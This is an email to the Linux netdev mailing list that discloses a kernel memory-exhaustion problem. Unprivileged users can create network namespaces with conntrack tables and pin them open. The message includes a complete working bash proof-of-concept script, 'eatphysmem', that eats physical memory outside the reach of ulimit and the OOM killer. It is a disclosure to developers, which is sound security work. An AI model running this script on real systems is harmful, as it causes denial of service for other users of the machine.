From: yumkam@gmail.com (Yuriy M. Kaminskiy)
Subject: [q] userns, netns, and quick physical memory consumption by unprivileged user
Date: Wed, 02 Mar 2016 23:38:11 +0300
Message-ID: <m3d1rclioc.fsf@gmail.com>
Mime-Version: 1.0
Content-Type: text/plain
To: netdev@vger.kernel.org
Return-path: <netdev-owner@vger.kernel.org>
Received: from plane.gmane.org ([80.91.229.3]:50103 "EHLO plane.gmane.org"
	rhost-flags-OK-OK-OK-OK) by vger.kernel.org with ESMTP
	id S1754263AbcCBUi1 (ORCPT <rfc822;netdev@vger.kernel.org>);
	Wed, 2 Mar 2016 15:38:27 -0500
Received: from list by plane.gmane.org with local (Exim 4.69)
	(envelope-from <linux-netdev-2@m.gmane.org>)
	id 1abDXM-0002Fk-RS
	for netdev@vger.kernel.org; Wed, 02 Mar 2016 21:38:24 +0100
Received: from ppp37-190-56-21.pppoe.spdop.ru ([37.190.56.21])
        by main.gmane.org with esmtp (Gmexim 0.1 (Debian))
        id 1AlnuQ-0007hv-00
        for <netdev@vger.kernel.org>; Wed, 02 Mar 2016 21:38:24 +0100
Received: from yumkam by ppp37-190-56-21.pppoe.spdop.ru with local (Gmexim 0.1 (Debian))
        id 1AlnuQ-0007hv-00
        for <netdev@vger.kernel.org>; Wed, 02 Mar 2016 21:38:24 +0100
Sender: netdev-owner@vger.kernel.org
List-ID: <netdev.vger.kernel.org>

While looking at 759c01142a5d0f364a462346168a56de28a80f52, I remembered about
infamous
    nf_conntrack: falling back to vmalloc
message, that was often triggered by network namespace creation (message
was removed recently, but it changed nothing with underlying problem).

So, how about something like this:

$ cat << EOF >> eatphysmem
#!/bin/bash -xe
fd=6
d="`mktemp -d /tmp/eatmemXXXXXXXXX`"
cd "$d"
rule="iptables -A INPUT -m conntrack --ctstate ESTABLISHED -j ACCEPT"
# rule="$rule;$rule"
# ... just because we can; same with any number of ip ro/ru/etc
while :; do
#for i in {1..1024}; do
    let fd=fd+1
    if [ -e /proc/$$/fd/$fd ]; then continue;fi
    mkfifo f1 f2
    unshare -rn sh -xec "echo foo >f1;ip li se lo up; $rule;read r <f2" &
    pid=$!
    read r <f1
    eval "exec $fd</proc/$pid/ns/net"
    echo bar >f2
    wait
    rm f2 f1
    sleep 1s
done
sleep inf
EOF
$ chmod a+x eatphysmem; unshare -rpf --mount-proc ./eatphysmem
?

You can easily eat 0.5M physical memory per netns (conntrack hash table
(hashsize*sizeof(list_head))) and more, and pin them to single process
with opened netns fds.
What can stop it?
ulimit? What is ulimit? Conntrack knows nothing about them.
Ah-yeah, `ulimit -n`? 64k. 64k*512k = 32G. Per process. Oh-uh.
OOM killer? But this is not this process memory; if any, it will be
killed last.
(I wonder, if memcg can tackle it; probably yes; but how many people
have it configured?).
